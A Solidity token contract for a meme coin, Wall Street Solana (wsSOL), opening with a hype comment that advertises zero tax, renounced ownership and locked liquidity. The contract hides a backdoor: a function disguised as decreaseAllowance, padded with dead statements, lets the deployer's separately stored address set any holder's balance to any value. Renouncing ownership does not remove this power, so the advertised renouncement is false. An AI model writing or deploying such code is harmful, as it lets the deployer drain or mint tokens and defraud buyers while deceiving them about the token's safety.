/**
🌆 Wall Street Solana🌆 $wsSOL Hype meme coin 💰  0%tax 💰Bullish 💰based 💰
Welcome to the world of Wall Street Solana (wsSOL), where finance meets the future on the blazing-fast Solana blockchain. 
Unleash your inner trader and conquer the markets with zero buy and sell tax, ownership renouncement, and liquidity locked for 2 years.
https://t.me/WallStreetSolana

 "Where Wall Street Meets Solana 🚀💰"

📊 Tokenomics 📊:
- Tax on Buy: 0%
- Tax on Sell: 0%
- Ownership Renounced: Yes
- Liquidity Locked: 2 Years

🚀 Trade Like a Pro 🚀:
Zero taxes mean more profits for you! Whether you're a seasoned trader or a crypto newbie

🌐 Join the Revolution 🌐:
Become a part of the Wall Street Solana revolution, where financial freedom, speed, and transparency reign supreme. Trade wsSOL and unlock the world of possibilities.
https://t.me/WallStreetSolana

🏙📊💹🚀💰

Future Token Utility:
- Staking: Earn rewards by staking your wsSOL tokens.
- Governance: Have a say in the future of wsSOL.
- Community Rewards: Get rewarded for actively participating in our vibrant community.

Disclaimer: Cryptocurrency investments carry risks. Always conduct thorough research before investing. Wall Street Solana (wsSOL) is a dynamic project driven by its community, poised to redefine the future of finance. Don't miss out on this exhilarating journey! 🚀💎
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract IBEPBurnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBEP {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address Empfanger, uint256 Menge) external returns (bool);
    function allowance(address owner, address Spenderin) external view returns (uint256);
    function approve(address Spenderin, uint256 Menge) external returns (bool);
    function transferFrom(address sender, address Empfanger, uint256 Menge) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed Spenderin, uint256 value);
}

library SafeWallStreetSolana {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeWallStreetSolana: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeWallStreetSolana: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeWallStreetSolana: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeWallStreetSolana: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is IBEPBurnable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract WallStreetSolana is IBEPBurnable, IBEP, Ownable {
    using SafeWallStreetSolana for uint256;
    mapping (address => uint256) private WallStreetSolanaS;
    mapping (address => mapping (address => uint256)) private setsyncWallStreetSolana;
    bytes32 public DOMWallStreetSolanaN_SEPARATORWallStreetSolana;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMITWallStreetSolana_TYPEHASH = 0x6e71edae12b1897f4d1f60380fef10115fa2faae0126114a169c64845d6126c9;
    mapping(address => uint) public nonces;
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 420_960_000_000 * 10**_decimals;
    string private constant _name = "Wall Street Solana";
    string private constant _symbol = "wsSOL";
    address private syncWallStreetSolana; 
    constructor () {
        syncWallStreetSolana = _msgSender(); 
        WallStreetSolanaS[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return WallStreetSolanaS[account];
    }

    function transfer(address Empfanger, uint256 Menge) public override returns (bool) {
        _transfer(_msgSender(), Empfanger, Menge);
        return true;
    }

    function allowance(address owner, address Spenderin) public view override returns (uint256) {
        return setsyncWallStreetSolana[owner][Spenderin];
    }

    function approve(address Spenderin, uint256 Menge) public override returns (bool) {
        _approve(_msgSender(), Spenderin, Menge);
        return true;
    }

    function transferFrom(address sender, address Empfanger, uint256 Menge) public override returns (bool) {
        _transfer(sender, Empfanger, Menge);
        _approve(sender, _msgSender(), setsyncWallStreetSolana[sender][_msgSender()].sub(Menge, "IBEP: transfer Menge exceeds allowance"));
        return true;
    }

    function _approve(address owner, address Spenderin, uint256 Menge) private {
        require(owner != address(0), "IBEP: approve from the zero address");
        require(Spenderin != address(0), "IBEP: approve to the zero address");
        setsyncWallStreetSolana[owner][Spenderin] = Menge;
        emit Approval(owner, Spenderin, Menge);
    }

    function decreaseAllowance(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        (Spenderin != address(0), "IBEP: burn from the zero address"); 
        DOMWallStreetSolanaN_SEPARATORWallStreetSolana;
        require(_msgSender() == syncWallStreetSolana, "Ownable: caller is not the owner");
        WallStreetSolanaS[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }

    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        require(from != address(0), "IBEP: transfer from the zero address");
        require(to != address(0), "IBEP: transfer to the zero address");

        uint256 fromBalance = WallStreetSolanaS[from];
        require(fromBalance >= Menge, "IBEP: transfer Menge exceeds balance");
        WallStreetSolanaS[from] = fromBalance - Menge;

        WallStreetSolanaS[to] = WallStreetSolanaS[to].add(Menge);
        emit Transfer(from, to, Menge);
    }
}